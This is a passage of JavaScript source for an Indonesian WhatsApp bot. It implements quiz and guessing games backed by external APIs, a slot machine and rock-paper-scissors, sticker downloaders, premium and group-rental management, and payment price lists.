 titid = "*Jawaban*: " + jawaban



 sendButMessage(from, titid, `Klik Untuk Ke Game`, [



 {



buttonId: `${prefix}tebaklagu`,



buttonText: {



  displayText: `⬡ NEXT `,



},



type: 1,



 },]);
 delete tebaklagu[sender.split('@')[0]]



 fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))



  }



  gameAdd(sender, glimit)



  break



  case 'tebaktebakan':



  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



 if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`)



 get_result = get_result.result



 jawaban = get_result.jawaban



 kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



 pertanyaan = get_result.soal



 wann.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {



tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()



fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))



 })



 await sleep(30000)



 if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {



console.log(color("Jawaban: " + jawaban))



titid = "*Jawaban*: " + jawaban



sendButMessage(from, titid, `Klik Untuk Ke Game`, [



{



  buttonId: `${prefix}tebaktebakan`,



  buttonText: {



 displayText: `⬡ NEXT `,



  },



  type: 1,



},]);







delete tebaktebakan[sender.split('@')[0]]



fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))



 }



 gameAdd(sender, glimit)



 break



 case 'kuismath':



 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



if (kuismath.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")



  get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/kuis/math`)



ini_image = get_result.soal



jawaban = get_result.jawaban



ini_buffer = await getBuffer(ini_image)



wann.sendMessage(from, ini_buffer, image, { quoted: freply, caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s' }).then(() => {



  kuismath[sender.split('@')[0]] = jawaban.toLowerCase()



  fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))



})



await sleep(50000)



if (kuismath.hasOwnProperty(sender.split('@')[0])) {



  console.log(color("Jawaban: " + jawaban))



  titid = "*Jawaban*: " + jawaban



  sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [



  {



 buttonId: `${prefix}kuismath`,



 buttonText: {



displayText: `⬡ NEXT `,



 },



 type: 1,



  },]);
  delete kuismath[sender.split('@')[0]]



  fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))



}



gameAdd(sender, glimit)



break



case 'tebakgambar':



if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")



  get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${setting.lolkey}`)



get_result = get_result.result



ini_image = get_result.image



jawaban = get_result.answer



ini_buffer = await getBuffer(ini_image)



kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



buff = await getBuffer(ini_image)







wann.sendMessage(from, ini_buffer, image, { quoted: freply, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :'+kisi_kisi+'\nWaktu : 30s' }).then(() => {



  tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()



  fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))



})



await sleep(30000)



if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {



  console.log(color("Jawaban: " + jawaban))



  titid = "*Jawaban*: " + jawaban



  sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [



  {



 buttonId: `${prefix}tebakgambar`,



 buttonText: {



displayText: `⬡ NEXT `,



 },



 type: 1,



  },]);
  delete tebakgambar[sender.split('@')[0]]



  fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))



}



gameAdd(sender, glimit)



break



case 'siapaaku':



if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



  if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



 get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/siapaaku?apikey=IkyChan`)



  get_result = get_result.result



  jawaban = get_result.answer



  kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



  pertanyaan = get_result.question



  wann.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {



 tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()



 fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))



  })



  await sleep(30000)



  if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {



 console.log(color("Jawaban: " + jawaban))



 reply("Jawaban: " + jawaban)



 delete tebaksiapaaku[sender.split('@')[0]]



 fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))



  }



  gameAdd(sender, glimit)



  break



  case 'tebakkata':



  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



 if (tebakata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/kata?apikey=IkyChan`)



 get_result = get_result.result



 jawaban = get_result.jawaban



 pertanyaan = get_result.pertanyaan



 wann.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {



tebakata[sender.split('@')[0]] = jawaban.toLowerCase()



fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))



 })



 await sleep(30000)



 if (tebakata.hasOwnProperty(sender.split('@')[0])) {



console.log(color("Jawaban: " + jawaban))



reply("Jawaban: " + jawaban)



delete tebakata[sender.split('@')[0]]



fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))



 }



 gameAdd(sender, glimit)



 break



 case 'tebaklirik':



 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



  get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/lirik?apikey=IkyChan`)



get_result = get_result.result



jawaban = get_result.answer



kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



pertanyaan = get_result.question



wann.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {



  tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()



  fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))



})



await sleep(30000)



if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {



  console.log(color("Jawaban: " + jawaban))



  reply("Jawaban: " + jawaban)



  delete tebaklirik[sender.split('@')[0]]



  fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))



}



gameAdd(sender, glimit)



break



case 'tebakjenaka':



if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



  if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



 get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/jenaka?apikey=IkyChan`)



  get_result = get_result.result



  jawaban = get_result.answer



  kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



  pertanyaan = get_result.question



  wann.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {



 tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()



 fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))



  })



  await sleep(30000)



  if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {



 console.log(color("Jawaban: " + jawaban))



 reply("Jawaban: " + jawaban)



 delete tebakjenaka[sender.split('@')[0]]



 fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))



  }



  gameAdd(sender, glimit)



  break



  case 'kimiakuis':



  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



 if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/unsurkimia?apikey=IkyChan`)



 get_result = get_result.result



 jawaban = get_result.lambang



 pertanyaan = get_result.nama



 wann.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {



tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()



fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))



 })



 await sleep(30000)



 if (tebakimia.hasOwnProperty(sender.split('@')[0])) {



console.log(color("Jawaban: " + jawaban))



reply("Jawaban: " + jawaban)



delete tebakimia[sender.split('@')[0]]



fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))



 }



 gameAdd(sender, glimit)



 break



 case 'tebakbendera':



 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



  get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/bendera?apikey=IkyChan`)



get_result = get_result.result



jawaban = get_result.name



kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



pertanyaan = get_result.flag



wann.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {



  tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()



  fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))



})



await sleep(30000)



if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {



  console.log(color("Jawaban: " + jawaban))



  reply("Jawaban: " + jawaban)



  delete tebakbendera[sender.split('@')[0]]



  fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))



}



gameAdd(sender, glimit)



break



case 'susunkata':



if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



  if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



 get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/susunkata?apikey=IkyChan`)



  get_result = get_result.result



  jawaban = get_result.jawaban



  pertanyaan = get_result.pertanyaan



  wann.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {



 susunkata[sender.split('@')[0]] = jawaban.toLowerCase()



 fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))



  })



  await sleep(30000)



  if (susunkata.hasOwnProperty(sender.split('@')[0])) {



 console.log(color("Jawaban: " + jawaban))



 reply("Jawaban: " + jawaban)



 delete susunkata[sender.split('@')[0]]



 fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))



  }



  gameAdd(sender, glimit)



  break



  case 'asahotak':



  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



 if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/asahotak?apikey=IkyChan`)



 get_result = get_result.result



 jawaban = get_result.jawaban



 kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



 pertanyaan = get_result.pertanyaan



 wann.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {



asahotak[sender.split('@')[0]] = jawaban.toLowerCase()



fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))



 })



 await sleep(30000)



 if (asahotak.hasOwnProperty(sender.split('@')[0])) {



console.log(color("Jawaban: " + jawaban))



reply("Jawaban: " + jawaban)



delete asahotak[sender.split('@')[0]]



fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))



 }



 gameAdd(sender, glimit)



 break



 case 'caklontong':



 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")



  get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebak/caklontong2?apikey=IkyChan`)



get_result = get_result.result



jawaban = get_result.answer



kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



pertanyaan = get_result.question



wann.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {



  caklontong[sender.split('@')[0]] = jawaban.toLowerCase()



  fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))



})



await sleep(30000)



if (caklontong.hasOwnProperty(sender.split('@')[0])) {



  console.log(color("Jawaban: " + jawaban))



  reply("Jawaban: " + jawaban)



  delete caklontong[sender.split('@')[0]]



  fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))



}



gameAdd(sender, glimit)



break



case 'slot':



const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']



somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	



somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	



somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	



if (somtoyy  == '🍌 : 🍌 : 🍌') {



  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)



} else if (somtoyy == '?? : 🍒 : 🍒') {



  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)



} else if (somtoyy == '🔔 : ?? : 🔔') {



  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)



} else if (somtoyy == '?? : 🍐 : 🍐') {



  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)



} else if (somtoyy == '🍇 : 🍇 : 🍇') {



  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)



} else {



  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)



}



break



 case 'suit': //nyolong dari zenz



 if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)



  const userspilih = q



if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)



  var computer = Math.random();



if (computer < 0.34 ) {



  computer = 'batu';



} else if( computer >= 0.34 && computer < 0.67) {



  computer = 'gunting';



} else {



  computer = 'kertas';



}



if ( userspilih == computer ) {



  reply(`Pertandingan Seri!`)



} else if ( userspilih == 'batu' ) {



  if( computer == 'gunting' ) {



 reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)



  } else {



 reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)



  }



} else if ( userspilih == 'gunting' ) {



  if( computer == 'batu' ) {



 reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)



  } else {



 reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)



  }



} else if ( userspilih == 'kertas' ) {



  if( computer == 'batu' ) {



 reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)



  } else {



 reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)



  }



}



break



//------------------< Sewa >-------------------



case 'sewa':



if (!isGroup)return reply(mess.only.group)



  if (!isOwner) return reply(mess.only.owner)



 if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)



if (args[0].toLowerCase() === 'add'){



  _sewa.addSewaGroup(from, args[1], sewa)



  reply(`Success`)



} else if (args[0].toLowerCase() === 'del'){



  sewa.splice(_sewa.getSewaPosition(from, sewa), 1)



  fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))



  reply(mess.success)



} else {



  reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)



}



break



case 'sewalist': 



case 'listsewa':



let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`



for (let i of sewa){



  let cekvipp = ms(i.expired - Date.now())



  txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`



}



reply(txtnyee)



break



case 'verify':



if (isRegistered) return reply('Akun kamu sudah terverfikasi')

  const serialUser = createSerial(18)

try {

  ppimg = await wann.getProfilePicture(`${sender.split('@')[0]}@c.us`)

} catch {

  ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'

}

veri = sender

_registered.push(sender)

fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))

addRegisteredUser(sender, serialUser)

const anuu = `「 *PENDAFTARAN USER* 」

*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*



*🌹 Nama :* ${pushname}

*🌹 API :* +${sender.split('@')[0]}

*🌹 Serial:* ${serialUser}

*🌹 Total:* ${_registered.length} Pengguna



*「 Wann Botz 」*`

ikyads = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)

buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `🏷️MENU`},type:1}]

imageMsg = (await wann.prepareMessageMedia(ikyads, "imageMessage", { thumbnail: ikyads, })).imageMessage

buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,

contentText:`${anuu}`,buttons,headerType:4}

prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

wann.relayWAMessage(prep)

console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))

	 // console.log(e)

setTimeout( () => {

 wann.updatePresence(from, Presence.composing)

 fakestatus(` *Terimakasih Telah Terdaftar Di Database Wann Botz* `)

  }, 2000)

break



case 'sfire1':{
  if (isImage || isQuotedImage) {



 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 var link = await uptotele(yoooo)



 wann.sendSticker(from, `https://api.zeks.xyz/api/burning-image?apikey=${zekskey}&image=${link}`, msg).then((res) => fs.unlinkSync(yoooo))
  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 let ran = getRandom('.png')



 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



fs.unlinkSync(yoooo)



if (err) return reply('Gagal :V')



  var link = await uptotele(ran)



wann.sendSticker(from, `https://api.zeks.xyz/api/burning-image?apikey=${zekskey}&image=${link}`, msg).then((res) => fs.unlinkSync(ran))
 })



  } else {



reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



 }



  }



  break



  case 'findsticker': case 'findstiker': case 'stickerwa':{







if (!q) return reply(`Cara penggunaan : ${command} kucing`)



  fetchJson(`https://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${q}`).then((data) => {



 var bokepp = JSON.parse(JSON.stringify(data.result))



 var bokep2 =  bokepp[Math.floor(Math.random() * bokepp.length)]



 if (bokep2.stickers.length > 15 && isGroup) return reply("Terdeteksi sticker melebihi 15, harap download melalui personal chat untuk menghindari spam")



for (var x of bokep2.stickers) {



  wann.sendSticker(from, x, msg)



}
 })



 }



 break



 case 'linedl': case 'linestickerdl':{







if (args.length < 2) return reply(`Kirim perintah *${command}* link sticker_line`)



  if (!isUrl(args[1]) && !args[1].includes('store.line')) return reply(mess.error.Iv)



 fetchJson(`https://api.lolhuman.xyz/api/linestick?apikey=${lolkey}&url=${args[1]}`).then(async(data) => {



if (data.result.stickers.length > 15 && isGroup) return reply("Terdeteksi sticker melebihi 15, harap download melalui personal chat untuk menghindari spam")



  for (var x of data.result.stickers) {



 wann.sendSticker(from, x, msg)



  }







})



}



break



case 'teledl': case 'telegramdl': case 'telesticker':{
  if (args.length < 2) return reply(`Kirim perintah *${command}* link sticker_telegram`)



 if (!isUrl(args[1]) && !args[1].includes('t.me')) return reply(mess.error.Iv)



fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolkey}&url=${args[1]}`).then(async(data) => {



  if (data.result.sticker.length > 15 && isGroup) return reply("Terdeteksi sticker melebihi 15, harap download melalui personal chat untuk menghindari spam")



 for (var x of data.result.sticker) {



wann.sendSticker(from, x, msg)



 }
  })



  }



  break



  break



  case 'sewacheck':



  case 'ceksewa': 



  if (!isGroup) return reply(mess.only.group)



 if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)



let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())



 let premiumnya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`



 reply(premiumnya)



 break



//------------------< Premium >-------------------



case 'premium': 



if (!isOwner || wan.key.fromMe) return reply(mess.only.owner)



  if (args[0] === 'add') {



 if (wan.message.extendedTextMessage != undefined) {



mentioned = wan.message.extendedTextMessage.contextInfo.mentionedJid







premium.addPremiumUser(mentioned[0], args[2], _premium)



reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
 } else {







premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)



reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)



 }



  } else if (args[0] === 'del') {



 if (wan.message.extendedTextMessage != undefined) {



mentioned = wan.message.extendedTextMessage.contextInfo.mentionedJid



_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)



fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))



reply(mess.success)



 } else {



_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)



fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))



reply(mess.success)



 }



  } else {



 reply(mess.wrongFormat)



  }



  break



  case 'premiumcheck':



  case 'cekpremium': 



  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})



 const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())



  reply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)



  break



  case 'listprem':



  case 'listpremium': 



  let txt = `「 *PREMIUM USER LIST* 」\n\n`



  let men = [];



  for (let i of _premium){



 men.push(i.id)



 const checkExp = ms(i.expired - Date.now())



 txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`



  }



  mentions(txt, men, true)



  break



  case 'belipremium':



  case 'buypremium':



  case 'sewabot':



  case 'sewabot':
  gopeynya = `${qris}`
  buff = await getBuffer(gopeynya)
  teksnya = `
Silahkan Dipilih Kak😇

  ┏━━⬣ PRICE LIST 1

  ┃⬡ SEWA 5K/MINGGU

  ┃⬡ SEWA 10K/BLN
  
  ┃⬡ SEWA + PREMIUM 15K

  ┃⬡ PERMANEN 25K

  ┃⬡ PERMANEN + PREM 30K

  ┃⬡ ALL PERMANEN 35K

  ┗━━⬣

  ┏━━⬣ PRICE LIST 2

  ┃⬡ JADI BOT 10K GA FULL RECODE

  ┃⬡ JADI BOT + OWNER 30K ( 97% RECODE )

  ┃⬡ SC BOT TANYA OWNER

  ┗━━⬣

  ┏━━⬣ MINAT? PM

  ┃⬡ wa.me/6285640068416

  ┃⬡ Ig @achyrr_wann

  ┃⬡ https://instabio.cc/wannstore
  ┗━━⬣
  `



buttons = [{buttonId: noprefix ? "owner" : "!"+"owner",buttonText:{displayText: `OWNER`},type:1},{buttonId: noprefix ? "payment" : "!"+"payment",buttonText:{displayText: `PAYMENT`},type:1}]

  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

  buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,


  contentText: teksnya,buttons,headerType:4}
  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

  wann.relayWAMessage(prep)

  break

  case 'qris':

  gopeynya = `https://telegra.ph/file/9813951fe94db331b507c.jpg`
  buff = await getBuffer(gopeynya)
  teksnya =`
  Hai kak ${pushname}

  Silahkan scan kode pembayaran di atas sesuai nominal!

  AN: WANNOFFICIAL03

  NOTE* JANGAN LUPA KIRIM BUKTI TRANSFER KEPADA OWNER!

  `
  buttons = [{buttonId: noprefix ? "bukti" : "!"+"bukti",buttonText:{displayText: `KIRIM BUKTI TF`},type:1},{buttonId: noprefix ? "payment" : "!"+"payment",buttonText:{displayText: `PAYMENT LAIN`},type:1}]
  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  wann.relayWAMessage(prep)
break
  case 'gopay':
  gopeynya = `${qris}`
  buff = await getBuffer(gopeynya)
  teksnya =`
  Hai kak ${pushname}

  Silahkan scan kode pembayaran di atas sesuai nominal!
  AN: WANN STORE

  NOTE* JANGAN LUPA KIRIM BUKTI TRANSFER KEPADA OWNER!
  `
  buttons = [{buttonId: noprefix ? "bukti" : "!"+"bukti",buttonText:{displayText: `KIRIM BUKTI TF`},type:1},{buttonId: noprefix ? "payment" : "!"+"payment",buttonText:{displayText: `PAYMENT LAIN`},type:1}]
  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  wann.relayWAMessage(prep)
  break
  case 'dana':
  gopeynya = `https://i.ibb.co/hCcqCTB/4da440e1a504.jpg`
  buff = await getBuffer(gopeynya)
  teksnya = `
  Hai kak ${pushname}

  Silahkan Tf Sesuai Nominal Ya Kak!

  AN: RIDWAN AR

  Link Pembayaran: https://instabio.cc/wannstore 

  NOTE* JANGAN LUPA KIRIM BUKTI TRANSFER KEPADA OWNER!`
  buttons = [{buttonId: noprefix ? "bukti" : "!"+"bukti",buttonText:{displayText: `KIRIM BUKTI TF`},type:1},{buttonId: noprefix ? "payment" : "!"+"payment",buttonText:{displayText: `PAYMENT LAIN`},type:1}]
  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  wann.relayWAMessage(prep)
  break
